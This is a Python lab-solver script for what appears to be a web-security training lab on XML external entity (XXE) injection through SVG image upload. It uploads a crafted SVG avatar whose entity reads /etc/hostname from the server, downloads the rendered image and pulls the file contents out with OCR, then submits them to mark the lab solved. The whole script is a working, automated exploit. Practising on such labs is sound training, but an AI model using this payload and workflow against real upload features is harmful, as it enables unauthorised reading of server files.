import requests
import re
import sys
import pytesseract
import cv2
import numpy as np


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.solution = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def upload_malicious_svg_image(self):
        svg_image_data = '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="24" x="20" y="100" fill="red">&xxe;</text></svg>'
        data = {
            'csrf': self.get_csrf_token('post?postId=1'),
            'postId': '1',
            'comment': 'hacker',
            'name': 'hacker',
            'email': 'hacker@hacker.com',
            'website': 'https://hacker.com'

        }
        files = {
            'avatar': ('image.svg', svg_image_data)
        }
        self.session.post(self.lab_url + 'post/comment', files=files, data=data)

    @staticmethod
    def preprocess_image(image_data):
        image_array = np.frombuffer(image_data, np.uint8)
        img = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        thresh = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2)
        return thresh

    @staticmethod
    def extract_text_from_image(thresh_image):
        text = pytesseract.image_to_string(thresh_image, config='--psm 6')
        return text

    def get_text_from_image(self):
        response = self.session.get(self.lab_url + 'post/comment/avatars?filename=32.png')
        preprocessed_image = self.preprocess_image(response.content)
        self.solution = self.extract_text_from_image(preprocessed_image).strip()
        print(self.solution)

    def submit_solution(self):
        data = {
            'answer': self.solution
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.upload_malicious_svg_image()
        self.get_text_from_image()
        self.submit_solution()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
